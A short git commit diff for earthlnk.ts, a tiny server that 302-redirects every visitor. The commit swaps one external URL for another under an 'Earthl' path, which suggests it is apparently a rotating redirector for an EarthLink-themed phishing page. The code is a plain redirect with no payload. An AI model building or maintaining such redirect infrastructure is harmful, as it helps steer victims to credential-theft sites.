15a798b383d8dc640c2758dce9a24d5b8adc7ce7
Digital2025001 <bosmichael30@gmail.com>
2025-07-12 06:20:38 -0700

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://labosoft.org/Earthl/_+_==/", // Replace this with your actual link
+      Location: "https://ultrapro.io/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
